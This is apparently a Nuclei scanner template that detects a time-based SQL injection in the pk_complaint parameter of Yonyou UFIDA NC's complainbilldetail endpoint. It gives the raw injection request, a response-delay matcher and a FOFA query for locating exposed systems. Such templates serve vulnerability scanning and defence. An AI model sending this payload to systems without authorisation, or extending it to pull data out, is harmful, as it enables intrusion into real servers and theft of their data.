id: yonyou-nc-complainbilldetail-sqli

info:
  name: 用友 UFIDA NC complainbilldetail - sqli
  author: leadlife
  severity: high
  description: 用友 NC 系统中的complainbilldetail接口存在SQL注入漏洞。攻击者可以利用接口中的pk_complaint参数进行SQL注入，从而窃取服务器的敏感信息。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-complainbilldetail%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: false
    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
  tags: yonyou,sqli,nc,oa,time

http:
  - raw:
      - |
        @timeout: 15s
        GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:6'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive

    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          # - contains_all(body,'/ebvp/')
          - duration >= 5 && duration < 9
        condition: and